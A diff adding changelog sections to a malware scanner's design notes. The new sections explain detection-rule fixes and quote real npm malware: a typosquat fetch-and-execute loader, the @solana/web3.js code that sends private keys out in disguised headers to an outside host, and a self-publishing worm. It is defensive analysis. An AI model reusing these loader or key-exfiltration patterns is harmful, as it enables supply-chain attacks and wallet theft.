@@ -946,6 +946,131 @@ release tagged while it was red, because the local runs that anyone actually
 watched could not import the test. A gate nobody reads is not a gate. The only
 thing that found the consequence was scanning real malware.
 
+### `Function.constructor` is `Function`
+
+A family of typosquats published through 2026 -- `chai-smart-assert`,
+`chai-chain-test`, `chai-as-validated`, `chain-async-test`, `cookie-parseflow`,
+`cookie-parsers-env` -- carries the same three lines, in a file like
+`src/utils/swap.js` beside real vendored library code:
+
+    const s = (await axios.get(src, { headers: { [k]: v } })).data.config;
+    const handler = new Function.constructor("require", s);
+    handler(require);
+
+Fetch code from a URL, compile it, hand it `require`. Cordon reported **nothing
+at all** in any of them, and it took two fixes to say why.
+
+`new Function.constructor(a, b)` is `new Function(a, b)`. Every function's
+constructor is the `Function` constructor, so the two compile and run
+identically -- and the execute primitive matched `new\s+Function\s*\(`, which
+the `.constructor` in the middle defeats. No execution was observed, so the
+`axios.get` beside it had nothing to combine with.
+
+Fixing that alone was not enough, and the reason is the most carefully argued
+comment in the pack. `SUSPECT.DROPPER.001` requires a **third** signal past
+egress and execute, because that pair on its own describes every deploy script
+ever written -- vLLM's CI produced thirteen CRITICAL findings of that shape
+earlier in this release. The three it accepts are a decode, an install hook, or
+`fetch_exec`, the primitive that says *the thing executed is the thing
+fetched*. These packages have none of the first two: the URL is in plain text,
+so nothing decodes, and the payload runs on `require`, not on install.
+
+So `CAP.JS.FETCH_EXEC.001` now reads the `await` form as well as the `.then`
+form it already knew. Two hundred characters between the fetch and the
+evaluator: room for those two lines and not much else.
+
+All six packages now report `SUSPECT.DROPPER.001` at HIGH. The benign corpus is
+unchanged, and so are ten real cryptography libraries -- `ethers`,
+`bitcoinjs-lib`, `web3`, `node-forge`, `jsonwebtoken`, `tweetnacl`, `bip39`,
+`eth-crypto`, `@noble/curves` and a clean `@solana/web3.js` -- which is the
+control that matters for a rule about fetching and running code.
+
+### Two long arrays bought a worm a ceiling
+
+`budi-kue16-riris` is a registry-spam worm and it is not subtle: generate a
+name from two word lists, rewrite `package.json`, `exec('npm publish --access
+public')`, repeat. Cordon found it. It reported it at **MEDIUM**, under the
+gate, because of this:
+
+    const indonesianNames = ["andi", "budi", "cindy", ... ];
+    const indonesianFoods = ["rendang", "sate", "nasiuduk", ... ];
+
+Two very long lines in a `.js` file, and `_is_minified` asked only whether the
+longest line was long and whether the extension was one a bundler writes. Both
+true, so the whole file was "minified output" and inherited the ceiling meant
+for vendored bundles. About thirty packages of that family are in the npm
+corpus. Every one of them was below the line for the same two arrays.
+
+A minifier deletes newlines -- that is its entire purpose -- so its output is
+one line, or three, and the mean line length is most of the file. Source
+somebody typed averages nearer forty bytes a line however long its longest line
+happens to be. `_is_minified` now asks that too.
+
+**This is the second time this release that this particular ceiling was found
+holding real malware, and the fifth ceiling overall.** The first fix required a
+bundler extension alongside the long line; this one requires the long lines to
+be what the file is mostly made of. Both were found the same way, by scanning
+real malware rather than by reading the code.
+
+### The key was in a variable, and it left in a header
+
+`@solana/web3.js` 1.95.7, published 2024-12-03, is in this corpus. Cordon found
+nothing in it. This is what it contains:
+
+    static addToQueue(process) {
+      const b = bs58.encode(process);
+      fetch("https://sol-rpc.xyz/api/rpc/queue", { method: "POST", headers: {
+        "x-amz-cf-id":  b.substring(0, 24).split("").reverse().join(""),
+        "x-session-id": b.substring(32),
+        "x-amz-cf-pop": b.substring(24, 32).split("").reverse().join("")
+      }}).catch(() => {});
+    }
+
+called from `Loader.addToQueue(this._secretKey)` and four other sites. The
+private key, base58-encoded, cut into three request **headers** shaped like
+CloudFront's own, two of them reversed, every error swallowed.
+
+Two reasons nothing fired. `credential` meant an environment variable or a
+credential file, and a private key held in a variable is neither. And the
+exfiltration is in the headers, not the body.
+
+`CAP.JS.KEYMATERIAL.001` names the first: a value called `secretKey`,
+`privateKey`, `mnemonic` or a recovery phrase. It is filed under `wallet` and
+not `credential` on purpose -- the existing wallet rule calls an address "a
+credential with a balance", and this is the half that spends it. Filing it as
+`credential` would have lit up every composite that pairs a credential with a
+network call, and a signing library reads key material and talks to an RPC
+endpoint for a living. `wallet` is named by one composite, gated on an install
+hook, so being wrong here is bounded.
+
+`MALWARE.EXFIL.WALLET_KEY.001` pairs it with egress inside five lines. That
+catches the shape most stealers use, where the read and the send are adjacent.
+**It does not catch `@solana/web3.js` itself**, and the honest reason is that
+the key and the `fetch` are in different functions hundreds of lines apart:
+seeing that connection is dataflow, and this is a pattern engine. Recorded here
+rather than claimed as fixed.
+
+### Proximity is a line count, and a minifier deletes lines
+
+Testing the rule above against ten real cryptography libraries produced one
+CRITICAL: `ethers`, the most used Ethereum library there is, twice, in
+`dist/ethers.min.js` and `dist/ethers.umd.min.js`.
+
+Both hits are on line 1, because the whole library is line 1. Every composite
+with a `proximity` degenerates to file scope on a bundle, so a rule written to
+say *this file does both things in the same breath* quietly becomes *this file
+does both things*. And a MALICIOUS composite is deliberately exempt from the
+minified ceiling -- malware is not excused for being generated output -- so
+nothing downstream would have caught it.
+
+A window must now be short in bytes as well as in lines: two hundred bytes per
+line of declared proximity, which is generous for source whose real mean is
+nearer forty, and far too short to span a bundle. This applies to every
+composite in the pack, not only the new one.
+
+The rule found a false positive in the library it was written to protect, before
+that rule was committed. That is what the ten-library control is for.
+
 ### A composite that one observation could satisfy
 
 `SUSPECT.REGISTRY.SELF_PUBLISH.001` asked for two things:
